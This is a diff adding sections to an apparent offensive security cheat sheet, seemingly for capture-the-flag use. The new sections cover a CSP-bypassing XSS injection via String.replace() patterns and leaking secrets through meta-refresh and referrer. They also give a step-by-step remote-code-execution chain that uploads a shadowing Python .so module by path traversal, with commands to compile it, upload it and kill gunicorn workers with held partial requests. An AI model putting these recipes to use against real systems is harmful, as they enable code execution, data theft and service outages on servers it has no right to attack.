@@ -263,6 +263,67 @@ print(payload)
 Also check: PyYAML `yaml.load()` (use `!!python/object/apply:os.system`),
 jsonpickle, shelve.
 
+## XSS — CSP Bypass via String.replace() Replacement Patterns
+When server-side code renders user input through `String.replace(pattern, value)`,
+JavaScript replacement patterns in the value re-inject template fragments:
+- `$\`` inserts the string BEFORE the match — on a nonce-d `<script>` line,
+  `secret=$\`;PAYLOAD;//` closes the assignment and injects code inside the
+  nonce-protected script block.
+- `$&` inserts the match itself, `$'` inserts the string after.
+- `escape()` does NOT neutralize backticks — use them for strings in payloads
+  when `'` `"` are escaped.
+
+Bot exfiltration under strict CSP (nonce-only `script-src`, no `unsafe-inline`):
+1. `<meta http-equiv=refresh>` navigation is NOT blocked by CSP — use it to
+   redirect the bot to a page you control or to a URL containing the secret.
+2. `document.referrer` carries the previous URL across same-origin navigations,
+   so a two-step chain (page-with-flag → meta-refresh → page-with-payload)
+   leaks the flag URL via referrer.
+
+## Python .so Module Shadowing (gunicorn/WSGI RCE via upload)
+When a Python app has a file-upload path traversal and blocks `.py`/`.pyc`,
+`.so` extension modules bypass the filter and achieve RCE on worker restart:
+
+1. **EXTENSION_SUFFIXES priority:** `.abi3.so` is checked before `.so` in
+   Python's import machinery, so `flask.abi3.so` shadows a real `flask.so`.
+   Use `.abi3.so` when overwrite is blocked (new file, higher priority suffix).
+2. **Shim pattern:** the `.so` must `PyInit_<modulename>()`, run payload via
+   `system()`, then fix `sys.path` (remove cwd/None entries), pop itself from
+   `sys.modules`, and re-import the real module. Return the real module object.
+   On Python 3.12.15+ returning a foreign module from `PyInit` raises
+   `SystemError` — use `PyModule_Create` + `PyDict_Merge(real.__dict__)` instead.
+3. **Worker kill to trigger reload:** gunicorn sync workers: send partial HTTP
+   headers (no blank line terminator, e.g. `POST / HTTP/1.1\r\nHost: x\r\nConte`)
+   and hold the connection >30s. The 30s timeout SIGKILLs the worker. Send
+   full headers with partial body gets instant 413 (no block). Fire 6+ partial
+   holds to kill all workers; arbiter respawns them and they import your shim.
+4. **Read-back trick:** if the app has a file-read primitive (e.g. processes
+   uploads and returns results via `send_file`), have the shim `cp` the flag
+   into the uploads dir with `_resized` suffix. **Contamination warning:** a
+   failed read may create a junk file at that name permanently (no overwrite).
+   Pick fresh names and confirm the writer ran before attempting the read.
+5. **Don't brick the target:** if every worker crashes on boot <1s,
+   supervisord marks the process FATAL and stops retrying — no self-heal,
+   port stays down. Test shims locally first. Always upload a `http.abi3.so`
+   fix-shim alongside `flask.abi3.so` to prevent `http.so` import failures
+   from cascading into a boot crash.
+
+```bash
+# Compile with Stable ABI for portability across Python 3.12+
+gcc -shared -fPIC -o flask.abi3.so flask_shim.c \
+  $(python3-config --includes) -DPy_LIMITED_API=0x030C0000
+# Upload with path traversal
+curl -F "file=@flask.abi3.so;filename=../flask.abi3.so" http://target/upload
+# Kill workers (6 parallel partial-header holds)
+for i in $(seq 6); do
+  timeout 75 python3 -c "
+import socket,time
+s=socket.create_connection(('TARGET',PORT),10)
+s.sendall(b'POST / HTTP/1.1\r\nHost: x\r\nConte')
+time.sleep(70)" &
+done; wait
+```
+
 ## Prototype Pollution (Node.js)
 Pollute `Object.prototype` via `__proto__` or `constructor.prototype` in JSON
 input. Leads to RCE when a code path reads from prototype (e.g., `child_process`
